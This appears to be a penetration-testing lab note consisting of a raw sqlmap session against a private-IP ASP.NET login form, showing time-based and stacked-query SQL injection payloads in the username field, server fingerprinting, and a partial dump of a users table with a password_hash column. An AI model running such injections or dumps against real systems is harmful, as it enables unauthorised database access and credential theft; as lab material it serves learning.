![](Pasted%20image%2020220215171740.png)
# Others

SQLmap test

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap --forms --crawl=2 -u http://192.168.70.63:450/ --dump -T users                                                                                         130 ⨯
        ___
       __H__                                                                                                                                                            
 ___ ___[,]_____ ___ ___  {1.5.2#stable}                                                                                                                                
|_ -| . [']     | .'| . |                                                                                                                                               
|___|_  [)]_|_|_|__,|  _|                                                                                                                                               
      |_|V...       |_|   http://sqlmap.org                                                                                                                             

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:33:35 /2022-02-15/

do you want to check for the existence of site's sitemap(.xml) [y/N] 
[02:33:44] [INFO] starting crawler for target URL 'http://192.168.70.63:450/'
[02:33:44] [INFO] searching for links with depth 1

[02:33:45] [INFO] searching for links with depth 2                                                                                                                     
please enter number of threads? [Enter for 1 (current)] 
[02:33:45] [WARNING] running in a single-thread mode. This could take a while
do you want to normalize crawling results [Y/n]                                                                                                                        
do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] 
[#1] form:
POST http://192.168.70.63:450/
POST data: __VIEWSTATE=%2FwEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk%2BMueM%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAQlk%2FdmKT4Sorxxd%2FxByuYXG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo%2BjB%2FFoQ%3D&ctl00$ContentPlaceHolder1$UsernameTextBox=&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter
do you want to test this form? [Y/n/q] 
> 
Edit POST data [default: __VIEWSTATE=%2FwEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk%2BMueM%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAQlk%2FdmKT4Sorxxd%2FxByuYXG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo%2BjB%2FFoQ%3D&ctl00$ContentPlaceHolder1$UsernameTextBox=&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] 
[02:33:49] [INFO] resuming back-end DBMS 'microsoft sql server' 
[02:33:49] [INFO] using '/home/kali/.local/share/sqlmap/output/results-02152022_0233am.csv' as the CSV results file in multiple targets mode
do you want to automatically adjust the value of '__EVENTVALIDATION'? [y/N] 
do you want to automatically adjust the value of '__VIEWSTATE'? [y/N] 
[02:33:51] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: ctl00$ContentPlaceHolder1$UsernameTextBox (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: __VIEWSTATE=/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=&ctl00$ContentPlaceHolder1$UsernameTextBox=';WAITFOR DELAY '0:0:5'--&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: __VIEWSTATE=/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=&ctl00$ContentPlaceHolder1$UsernameTextBox=' WAITFOR DELAY '0:0:5'-- vwgQ&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter
---
do you want to exploit this SQL injection? [Y/n] 
[02:33:51] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2016 or 10 or 2019
web application technology: Microsoft IIS 10.0, ASP.NET 4.0.30319, ASP.NET
back-end DBMS: Microsoft SQL Server 2017
[02:33:51] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[02:33:51] [INFO] fetching current database
[02:33:51] [INFO] resumed: butch
[02:33:51] [INFO] fetching columns for table 'users' in database 'butch'
[02:33:51] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                         
[02:34:00] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
[02:34:26] [INFO] adjusting time delay to 2 seconds due to good response times
3
[02:34:27] [WARNING] reflective value(s) found and filtering out of statistical model, please wait                                                                     
.............................. (done)
[02:34:40] [INFO] adjusting time delay to 1 second due to good response times
password_hash
[02:35:44] [INFO] retrieved: user_i
[02:36:19] [ERROR] invalid character detected. retrying..
[02:36:19] [WARNING] increasing time delay to 2 seconds
d
[02:36:28] [INFO] retrieved: username
[02:37:26] [INFO] fetching entries for table 'users' in database 'butch'
[02:37:26] [INFO] fetching number of entries for table 'users' in database 'butch'
[02:37:26] [INFO] retrieved: 1
[02:37:29] [WARNING] in case of table dumping problems (e.g. column entry order) you are advised to rerun with '--force-pivoting'
[02:37:29] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                
e7b2b^C
[02:38:10] [WARNING] Ctrl+C detected in dumping phase                                                                                                                  
[02:38:10] [WARNING] unable to retrieve the entries for table 'users' in database 'butch'
[02:38:10] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-02152022_0233am.csv'
[02:38:10] [WARNING] your sqlmap version is outdated

[*] ending @ 02:38:10 /2022-02-15/

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```